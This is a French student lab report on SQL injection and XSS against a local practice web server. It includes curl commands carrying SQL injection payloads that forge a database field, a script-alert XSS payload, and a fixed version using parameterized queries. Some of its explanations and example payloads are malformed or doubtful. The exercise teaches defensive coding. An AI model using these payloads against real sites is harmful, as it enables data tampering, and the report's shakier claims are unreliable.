# Rendu "Injection"

## Binome

Nom, Prénom, email: ___
Nom, Prénom, email: ___


## Question 1

* Quel est ce mécanisme?
Ce mécanisme est la vérification de la chaîne de caractères à insérer par une regex. 
qui vérifie si la chaîne de caractère ne contient pas de caractères spéciaux.

* Est-il efficace? Pourquoi? 

Non ! car une injection peut probablement contenir des conditions. 
Par ailleurs sur le navigateur web on peut toute fois désactiver le javascript pour faire des injections **sql**

## Question 2

* Votre commande curl

Voici la commande curl pour pouvoir envoyer des requêtes en POST: 

```sh 
$ curl -X POST  -d "chaine=<la chaine à insérer>&submit=OK"  http://localhost:8080/
```

Exemple d'insertion
===================

```sh 
$ curl -X POST  -d "chaine=2 ; SELECT * from /submit=OK"  http://localhost:8080/
```

Insertion
=========

```sh 
$ <p>
Liste des chaines actuellement insérées:
<ul>
<li>isi envoye par: 127.0.0.1</li>
<li>cat envoye par: 127.0.0.1</li>
<li>cat envoye par: 127.0.0.1</li>
<li>cat envoye par: 127.0.0.1</li>
<li>cat envoye par: 127.0.0.1</li>
<li>res envoye par: 127.0.0.1</li>
<li>res envoye par: 127.0.0.1</li>
<li>res envoye par: 127.0.0.1</li>
<li>res2 envoye par: 127.0.0.1</li>
<li>res2 envoye par: 127.0.0.1</li>
<li>res2 envoye par: 127.0.0.1</li>
<li>res80 envoye par: 127.0.0.1</li>
<li>res2 envoye par: 127.0.0.1</li>
<li>res2 envoye par: 127.0.0.1</li>
<li>res90 envoye par: 127.0.0.1</li>
<li>res2 envoye par: 127.0.0.1</li>
<li> envoye par: 127.0.0.1</li>
<li>res2 envoye par: 127.0.0.1</li>
<li> envoye par: 127.0.0.1</li>
<li> envoye par: 127.0.0.1</li>
<li>2  envoye par: 127.0.0.1</li>

``` 

On voit avec la dernière ligne que la donnée a bien été inséré.

## Question 3

* Votre commande curl qui va permettre de rajouter une entree en mettant un contenu arbutraire dans le champ 'who'

```sh 
$ curl -X POST  -d "chaine=hack','192.152.145.18') #"  http://localhost:8080/
```

* Expliquez comment obtenir des informations sur une autre table
Pour obtenir des informations sur une autre table on peut réaliser cette commande en la combinant avec une autre en utilisant **AND** puisque la première requête sera exécuté. Si on avait utilisé un **OR** cela ne fonctionneraît pas.

## Question 4
Rendre un fichier server_correct.py avec la correction de la faille de
sécurité. Expliquez comment vous avez corrigé la faille.

Implémentation 
==============

```py 
    def index(self, **post):
        cherrypy.response.cookie["ExempleCookie"] = "Valeur du cookie"
        cursor = self.conn.cursor()
        if cherrypy.request.method == "POST":
            requete = "INSERT INTO chaines (txt,who) VALUES(%s,%s)"
            values = (post["chaine"], cherrypy.request.remote.ip)
            print("req: [" + requete + "]")
            cursor.execute(requete, values)
            self.conn.commit()

        chaines = []
        cursor.execute("SELECT txt,who FROM chaines");
        for row in cursor.fetchall():
            chaines.append(row[0] + " envoye par: " + row[1])

        cursor.close()
        return '''
```

Explication
===========

Pour le corriger on a utilisé une requête paramétré composé de deux chaînes de caractères. 
Le premier spécifiant la colonne **post["chaine"]** et la colonne ****cherrypy.request.remote.ip**

## Question 5

* Commande curl pour afficher une fenetre de dialog. 
```sh 
$ curl -X POST  -d "chaine=<script>alert(\"hello\")</script>"  http://localhost:8080/
```

* Commande curl pour lire les cookies


## Question 6

Rendre un fichier server_xss.py avec la correction de la
faille. Expliquez la demarche que vous avez suivi.


